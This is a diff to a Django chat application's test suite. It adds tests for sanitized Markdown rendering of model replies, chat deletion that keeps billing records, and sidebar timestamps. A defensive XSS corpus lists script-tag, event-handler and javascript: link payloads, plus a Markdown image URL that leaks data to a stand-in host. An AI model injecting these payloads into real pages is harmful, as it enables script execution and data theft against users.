@@ -352,7 +352,8 @@ class ChatViewTests(TestCase):
         self.assertLess(sidebar.index("Newer chat"), sidebar.index("Older chat"))
         self.assertNotIn("Bob chat", sidebar)
         self.assertIn(
-            f'<a href="{reverse("chat_detail", args=[older.pk])}" aria-current="page">Older chat</a>',
+            f'<a class="chat-link" href="{reverse("chat_detail", args=[older.pk])}" aria-current="page">'
+            '<span class="chat-title">Older chat</span>',
             sidebar,
         )
         self.assertIn(f'href="{reverse("chat_new")}">+ New chat', sidebar)
@@ -446,7 +447,7 @@ class RenameTests(TestCase):
         self.assertEqual(self.conversation.title, "Trip to Rome")
         page = self.client.get(reverse("chat_detail", args=[self.conversation.pk]))
         self.assertContains(page, "<h1>Trip to Rome</h1>", html=True)
-        self.assertContains(page, 'aria-current="page">Trip to Rome</a>')
+        self.assertContains(page, 'aria-current="page"><span class="chat-title">Trip to Rome</span>')
         self.assertContains(self.client.get(reverse("profile")), "Trip to Rome")
 
     def test_invalid_titles_are_400(self):
@@ -520,7 +521,7 @@ class ChatJsonTests(TestCase):
         self.assertIn("Hello from the model", data["main_html"])
         self.assertIn('class="model-chip"', data["main_html"])
         self.assertNotIn("<select", data["main_html"])
-        self.assertIn('aria-current="page">First question</a>', data["sidebar_html"])
+        self.assertIn('aria-current="page"><span class="chat-title">First question</span>', data["sidebar_html"])
         self.assertEqual(data["balance"], "$1.99")  # $2.00 − $0.0011, rounded down
         self.assertEqual(self.balance(), 2_000_000 - 1_100)
 
@@ -966,3 +967,400 @@ class GlobalSystemPromptTests(TestCase):
         response = self.client.post(reverse("chat_new"), {"llm_model": model.pk, "content": "Hi"})
         self.assertEqual(response.status_code, 402)
         post.assert_not_called()
+
+
+# --- Safe Markdown (loop 5) ---------------------------------------------------------
+
+XSS_CORPUS = {
+    "script tag": "<script>alert(1)</script>",
+    "img onerror": '<img src=x onerror="alert(1)">',
+    "iframe": '<iframe src="https://evil.example"></iframe>',
+    "svg onload": "<svg onload=alert(1)>",
+    "style tag": "<style>body{background:url(https://evil.example/x)}</style>",
+    "raw js link": '<a href="javascript:alert(1)">x</a>',
+    "md js link": "[click](javascript:alert(1))",
+    "md js link, entity-encoded": "[click](&#106;avascript:alert(1))",
+    "md data link": "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
+    "autolink js": "<javascript:alert(1)>",
+    "md image exfil": "![a](https://evil.example/leak?q=secret)",
+    "aligned table (style)": "| a | b |\n|:--|--:|\n| 1 | 2 |",
+    "code class injection": '```x" onmouseover="alert(1)\ncode\n```',
+    "inline html in text": 'Hello <b onclick="alert(1)">there</b>',
+}
+
+SAFE_TAGS = {
+    "p", "br", "strong", "em", "s", "del", "code", "pre", "blockquote", "ul", "ol", "li",
+    "h1", "h2", "h3", "h4", "h5", "h6", "hr", "a", "table", "thead", "tbody", "tr", "th", "td",
+}
+
+
+def unsafe_html(html, allowed_tags=SAFE_TAGS):
+    """Parse `html` and list anything that shouldn't reach the page from model output."""
+    from html.parser import HTMLParser
+
+    issues = []
+
+    class Audit(HTMLParser):
+        def handle_starttag(self, tag, attrs):
+            if tag not in allowed_tags:
+                issues.append(f"<{tag}>")
+            for name, value in attrs:
+                value = value or ""
+                if name.startswith("on") or name in ("style", "src", "srcset"):
+                    issues.append(f"{tag}[{name}]")
+                if name == "href" and not value.lower().startswith(("http://", "https://", "mailto:")):
+                    issues.append(f"{tag}[href={value[:30]}]")
+                if tag == "code" and name == "class" and not re.fullmatch(r"language-[A-Za-z0-9_+-]+", value):
+                    issues.append(f"code[class={value[:30]}]")
+
+    Audit().feed(html)
+    return issues
+
+
+def thread_html(html):
+    """Just the message thread (the page chrome has its own allowed elements)."""
+    return html.split('class="thread-inner"', 1)[1].split('class="composer', 1)[0]
+
+
+def rendered_model_output(html):
+    """The inner HTML of every rendered reply. Sanitized output never contains a <div>,
+    so the first </div> closes the fragment."""
+    fragments = re.findall(r'<div class="bubble-text md">(.*?)</div>', html, re.S)
+    assert fragments, "no rendered model reply found"
+    return "".join(fragments)
+
+
+class MarkdownRenderingTests(TestCase):
+    def render(self, text):
+        from chat.markdown import render_markdown
+
+        return str(render_markdown(text))
+
+    def test_xss_corpus_is_neutralized(self):
+        for name, payload in XSS_CORPUS.items():
+            with self.subTest(case=name):
+                self.assertEqual(unsafe_html(self.render(payload)), [])
+
+    def test_image_becomes_a_plain_link(self):
+        html = self.render(XSS_CORPUS["md image exfil"])
+        self.assertNotIn("<img", html)
+        self.assertIn('href="https://evil.example/leak?q=secret"', html)
+        self.assertIn('rel="noopener noreferrer nofollow"', html)
+
+    def test_markdown_features(self):
+        html = self.render(
+            "**bold** *em* ~~gone~~ `inline`\n\n- one\n- two\n\n1. first\n\n"
+            "> quoted\n\n[site](https://example.com)\n\n"
+            "```python\nprint('<b>')\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |"
+        )
+        for fragment in (
+            "<strong>bold</strong>", "<em>em</em>", "<s>gone</s>", "<code>inline</code>",
+            "<ul>", "<li>one</li>", "<ol>", "<blockquote>",
+            '<code class="language-python">print(\'&lt;b&gt;\')', "<pre>",
+            "<table>", "<thead>", "<tbody>", "<td>1</td>",
+            'href="https://example.com"', 'rel="noopener noreferrer nofollow"',
+        ):
+            self.assertIn(fragment, html)
+        self.assertEqual(unsafe_html(html), [])
+
+    def test_table_alignment_style_is_stripped(self):
+        html = self.render(XSS_CORPUS["aligned table (style)"])
+        self.assertIn("<table>", html)
+        self.assertNotIn("style", html)
+
+    def test_empty_and_none(self):
+        self.assertEqual(self.render(""), "")
+        self.assertEqual(self.render(None), "")
+
+
+@override_settings(OPENAI_API_KEY="test-key")
+@mock.patch("llm.http.requests.post")
+class MarkdownInChatTests(TestCase):
+    def setUp(self):
+        self.user = User.objects.create_user("alice", password=PASSWORD)
+        self.gpt = make_gpt()
+        self.client.force_login(self.user)
+
+    def test_corpus_through_page_and_json(self, post):
+        for name, payload in XSS_CORPUS.items():
+            with self.subTest(case=name):
+                Conversation.objects.all().delete()
+                # New chat via JSON -> main_html
+                post.return_value = proxy_ok(payload)
+                data = self.client.post(
+                    reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"},
+                    HTTP_ACCEPT="application/json",
+                ).json()
+                self.assertEqual(unsafe_html(rendered_model_output(data["main_html"])), [], "main_html")
+                conversation = Conversation.objects.get()
+                # Existing chat via JSON -> messages_html
+                data = self.client.post(
+                    reverse("chat_detail", args=[conversation.pk]), {"content": "Again"},
+                    HTTP_ACCEPT="application/json",
+                ).json()
+                self.assertEqual(unsafe_html(rendered_model_output(data["messages_html"])), [], "messages_html")
+                # Full page (form mode rendering)
+                page = self.client.get(reverse("chat_detail", args=[conversation.pk])).content.decode()
+                self.assertEqual(unsafe_html(rendered_model_output(page)), [], "page")
+                # The whole thread, parsed: only Markdown tags plus our own div/span wrappers,
+                # and no event handler, style, src or unsafe link anywhere.
+                self.assertEqual(unsafe_html(thread_html(page), SAFE_TAGS | {"div", "span"}), [], "thread")
+
+    def test_reply_renders_markdown_but_is_stored_raw(self, post):
+        raw = "Here is **bold**:\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |"
+        post.return_value = proxy_ok(raw)
+        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"})
+        conversation = Conversation.objects.get()
+        reply = conversation.messages.get(role="assistant")
+        self.assertEqual(reply.content, raw)  # stored raw
+
+        page = thread_html(self.client.get(reverse("chat_detail", args=[conversation.pk])).content.decode())
+        self.assertIn('<div class="bubble-text md"><p>Here is <strong>bold</strong>:</p>', page)
+        self.assertIn("<table>", page)
+
+        post.return_value = proxy_ok("ok")
+        self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Next"})
+        resent = post.call_args.kwargs["json"]["messages"]
+        self.assertEqual(resent[1], {"role": "assistant", "content": raw})  # resent raw
+
+    def test_user_messages_are_not_rendered(self, post):
+        post.return_value = proxy_ok("fine")
+        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "**not bold** <i>x</i>"})
+        page = thread_html(self.client.get(reverse("chat_detail", args=[Conversation.objects.get().pk])).content.decode())
+        self.assertIn("**not bold** &lt;i&gt;x&lt;/i&gt;", page)
+        self.assertNotIn("<strong>not bold</strong>", page)
+
+
+# --- Deleting chats (loop 5) --------------------------------------------------------
+
+def ledger_sum(user):
+    from django.db.models import Sum
+
+    return CreditTransaction.objects.filter(user=user).aggregate(t=Sum("amount_micros"))["t"]
+
+
+@override_settings(OPENAI_API_KEY="test-key")
+@mock.patch("llm.http.requests.post")
+class DeleteChatTests(TestCase):
+    def setUp(self):
+        self.user = User.objects.create_user("alice", password=PASSWORD)
+        self.gpt = make_gpt()
+        self.client.force_login(self.user)
+
+    def chat_with_replies(self, post, title, replies=2):
+        post.return_value = proxy_ok("reply")
+        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": title})
+        conversation = Conversation.objects.get(title=title)
+        for _ in range(replies - 1):
+            self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "more"})
+        return conversation
+
+    def balance(self):
+        return Wallet.objects.get(user=self.user).balance_micros
+
+    def test_confirmation_page(self, post):
+        conversation = self.chat_with_replies(post, "Trip plans", replies=1)
+        url = reverse("chat_delete", args=[conversation.pk])
+        response = self.client.get(url)
+        self.assertEqual(response.status_code, 200)
+        self.assertContains(response, "Delete “Trip plans”?")
+        self.assertContains(response, "can't be undone")
+        self.assertContains(response, "Charges for its replies stay in your usage history")
+        self.assertContains(response, f'<form method="post" action="{url}">')
+        self.assertContains(response, f'href="{reverse("chat_detail", args=[conversation.pk])}">Cancel</a>')
+        self.assertTrue(Conversation.objects.filter(pk=conversation.pk).exists())  # GET changes nothing
+
+    def test_access_rules(self, post):
+        bob = User.objects.create_user("bob", password=PASSWORD)
+        theirs = Conversation.objects.create(owner=bob, llm_model=self.gpt, title="Bob's")
+        url = reverse("chat_delete", args=[theirs.pk])
+        self.assertEqual(self.client.get(url).status_code, 404)
+        self.assertEqual(self.client.post(url).status_code, 404)
+        self.assertTrue(Conversation.objects.filter(pk=theirs.pk).exists())
+        self.assertEqual(self.client.get(reverse("chat_delete", args=[99999])).status_code, 404)
+        mine = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
+        self.assertEqual(self.client.put(reverse("chat_delete", args=[mine.pk])).status_code, 405)
+        self.client.logout()
+        response = self.client.post(reverse("chat_delete", args=[mine.pk]))
+        self.assertEqual(response.status_code, 302)
+        self.assertTrue(response.url.startswith(reverse("login")))
+
+    def test_delete_keeps_charges_and_balance(self, post):
+        older = self.chat_with_replies(post, "Older", replies=1)
+        doomed = self.chat_with_replies(post, "Doomed", replies=2)
+        charges_before = list(
+            CreditTransaction.objects.filter(message__conversation=doomed).values("id", "amount_micros", "note")
+        )
+        ledger_rows_before = CreditTransaction.objects.count()
+        balance_before = self.balance()
+
+        response = self.client.post(reverse("chat_delete", args=[doomed.pk]))
+
+        self.assertRedirects(response, reverse("chat_list"), fetch_redirect_response=False)
+        self.assertFalse(Conversation.objects.filter(pk=doomed.pk).exists())
+        self.assertFalse(Message.objects.filter(conversation_id=doomed.pk).exists())
+        # Charges stay: same rows, same amounts and notes, now with no message.
+        self.assertEqual(CreditTransaction.objects.count(), ledger_rows_before)
+        for before in charges_before:
+            row = CreditTransaction.objects.get(pk=before["id"])
+            self.assertIsNone(row.message_id)
+            self.assertEqual((row.amount_micros, row.note), (before["amount_micros"], before["note"]))
+        self.assertEqual(self.balance(), balance_before)  # no refund
+        self.assertEqual(self.balance(), ledger_sum(self.user))
+
+        # /chats/ now opens the remaining chat, which shows the flash message.
+        page = self.client.get(reverse("chat_list"), follow=True)
+        self.assertEqual(page.redirect_chain[-1][0], reverse("chat_detail", args=[older.pk]))
+        self.assertContains(page, "Chat deleted.")
+        self.assertNotContains(page, "Doomed")
+
+    def test_deleting_last_chat_opens_new_chat(self, post):
+        only = self.chat_with_replies(post, "Only one", replies=1)
+        self.client.post(reverse("chat_delete", args=[only.pk]))
+        self.assertRedirects(self.client.get(reverse("chat_list")), reverse("chat_new"))
+
+    def test_profile_deleted_chats_line_reconciles(self, post):
+        profile = self.client.get(reverse("profile"))
+        self.assertNotContains(profile, "Deleted chats")
+        kept = self.chat_with_replies(post, "Kept", replies=1)
+        doomed = self.chat_with_replies(post, "Doomed", replies=2)
+        self.client.post(reverse("chat_delete", args=[doomed.pk]))
+
+        profile = self.client.get(reverse("profile"))
+        self.assertContains(profile, "Deleted chats")
+        self.assertContains(profile, "2 replies in chats you deleted")
+        self.assertEqual(profile.context["deleted_replies"], 2)
+        self.assertEqual(profile.context["deleted_spent"], 2 * 1_100)
+        per_chat = sum(c.total_cost or 0 for c in profile.context["page"])
+        self.assertEqual(per_chat + profile.context["deleted_spent"], profile.context["total_spent"])
+        self.assertContains(profile, "$0.0022")  # the deleted total
+
+    def test_sidebar_and_header_delete_links(self, post):
+        conversation = self.chat_with_replies(post, "Linked", replies=1)
+        url = reverse("chat_delete", args=[conversation.pk])
+        page = main_region(self.client.get(reverse("chat_detail", args=[conversation.pk])))
+        self.assertIn(f'<a class="chat-delete" href="{url}" aria-label="Delete “Linked”"', page)
+        self.assertIn(f'<a class="delete-link" href="{url}">Delete</a>', page)
+
+    def test_reply_in_flight_when_chat_deleted(self, post):
+        for mode in ("form", "json"):
+            with self.subTest(mode=mode):
+                conversation = self.chat_with_replies(post, f"Racing {mode}", replies=1)
+                balance_before = self.balance()
+                messages_before = Message.objects.count()
+
+                def delete_then_reply(*args, **kwargs):
+                    Conversation.objects.filter(pk=conversation.pk).delete()  # e.g. from another tab
+                    return proxy_ok("late reply")
+
+                post.side_effect = delete_then_reply
+                headers = {"HTTP_ACCEPT": "application/json"} if mode == "json" else {}
+                response = self.client.post(
+                    reverse("chat_detail", args=[conversation.pk]), {"content": "Q2"}, **headers
+                )
+                post.side_effect = None
+
+                self.assertEqual(response.status_code, 404)
+                if mode == "json":
+                    self.assertEqual(response.json()["error"], "This chat was deleted.")
+                late = CreditTransaction.objects.get(note=f"Reply in deleted chat “Racing {mode}”")
+                self.assertEqual(late.amount_micros, -1_100)
+                self.assertIsNone(late.message_id)
+                self.assertEqual(self.balance(), balance_before - 1_100)  # charged, not lost
+                self.assertEqual(self.balance(), ledger_sum(self.user))
+                # Only the deleted chat's own messages went; nothing new was saved.
+                self.assertEqual(Message.objects.count(), messages_before - 2)
+
+    def test_race_backstop_when_check_passes_but_write_fails(self, post):
+        conversation = self.chat_with_replies(post, "Backstop", replies=1)
+        balance_before = self.balance()
+
+        def delete_then_reply(*args, **kwargs):
+            Conversation.objects.filter(pk=conversation.pk).delete()
+            return proxy_ok("late reply")
+
+        post.side_effect = delete_then_reply
+        # First existence check (inside the transaction) wrongly says "still there", so the
+        # writes run and fail; the backstop's re-check then sees it's gone.
+        with mock.patch("chat.services._conversation_exists", side_effect=[True, False]):
+            response = self.client.post(reverse("chat_detail", args=[conversation.pk]), {"content": "Q2"})
+        post.side_effect = None
+
+        self.assertEqual(response.status_code, 404)
+        self.assertEqual(CreditTransaction.objects.filter(note="Reply in deleted chat “Backstop”").count(), 1)
+        self.assertEqual(self.balance(), balance_before - 1_100)
+        self.assertEqual(self.balance(), ledger_sum(self.user))
+
+
+# --- Sidebar dates (loop 5) ---------------------------------------------------------
+
+@override_settings(OPENAI_API_KEY="test-key")
+@mock.patch("llm.http.requests.post")
+class SidebarDateTests(TestCase):
+    def setUp(self):
+        self.user = User.objects.create_user("alice", password=PASSWORD)
+        self.gpt = make_gpt()
+        self.client.force_login(self.user)
+
+    def sidebar(self, conversation):
+        page = main_region(self.client.get(reverse("chat_detail", args=[conversation.pk])))
+        return page.split('<section class="chat-main">')[0]
+
+    def times(self, html):
+        return re.findall(r'<time class="chat-date" datetime="([^"]+)" data-relative title="([^"]+)">([^<]+)</time>', html)
+
+    def test_each_row_has_a_last_activity_time(self, post):
+        from datetime import datetime, timezone
+
+        old = Conversation.objects.create(owner=self.user, llm_model=self.gpt, title="Old")
+        new = Conversation.objects.create(owner=self.user, llm_model=self.gpt, title="New")
+        Conversation.objects.filter(pk=old.pk).update(updated_at=datetime(2025, 9, 3, 23, 30, tzinfo=timezone.utc))
+        Conversation.objects.filter(pk=new.pk).update(updated_at=datetime(2026, 9, 29, 14, 5, tzinfo=timezone.utc))
+
+        rows = self.times(self.sidebar(new))
+        self.assertEqual(
+            rows,
+            [
+                ("2026-09-29T14:05:00+00:00", "Sep 29, 2026 14:05 UTC", "Sep 29, 2026"),
+                ("2025-09-03T23:30:00+00:00", "Sep 3, 2025 23:30 UTC", "Sep 3, 2025"),
+            ],
+        )
+
+    def test_send_bumps_date_and_order_but_rename_does_not(self, post):
+        post.return_value = proxy_ok("hi")
+        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "First"})
+        self.client.post(reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Second"})
+        first = Conversation.objects.get(title="First")
+        before = first.updated_at
+
+        self.client.post(reverse("chat_rename", args=[first.pk]), {"title": "First renamed"})
+        first.refresh_from_db()
+        self.assertEqual(first.updated_at, before)
+        sidebar = self.sidebar(first)
+        self.assertLess(sidebar.index("Second"), sidebar.index("First renamed"))
+
+        self.client.post(reverse("chat_detail", args=[first.pk]), {"content": "Again"})
+        first.refresh_from_db()
+        self.assertGreater(first.updated_at, before)
+        sidebar = self.sidebar(first)
+        self.assertLess(sidebar.index("First renamed"), sidebar.index("Second"))
+        self.assertIn(f'datetime="{first.updated_at.isoformat()}"', sidebar)
+
+    def test_json_sidebar_has_times(self, post):
+        post.return_value = proxy_ok("hi")
+        data = self.client.post(
+            reverse("chat_new"), {"llm_model": self.gpt.pk, "content": "Hi"}, HTTP_ACCEPT="application/json"
+        ).json()
+        self.assertEqual(len(self.times(data["sidebar_html"])), 1)
+        self.assertEqual(len(self.times(data["main_html"])), 1)  # the mobile copy
+
+    def test_script_localizes_after_every_sidebar_update(self, post):
+        conversation = Conversation.objects.create(owner=self.user, llm_model=self.gpt)
+        page = self.client.get(reverse("chat_detail", args=[conversation.pk])).content.decode()
+        script = page.split("<script data-chat-script>")[1].split("</script>")[0]
+        self.assertIn('$$("time[data-relative]")', script)
+        self.assertIn("function relativeLabel(date, now)", script)
+        replace_sidebars = script.split("function replaceSidebars(html) {")[1].split("// relativeLabel:start")[0]
+        self.assertIn("localizeTimes();", replace_sidebars)
+        after_main_swap = script.split('$(".chat-main").innerHTML = data.main_html;')[1].split("\n")[1]
+        self.assertIn("localizeTimes();", after_main_swap)
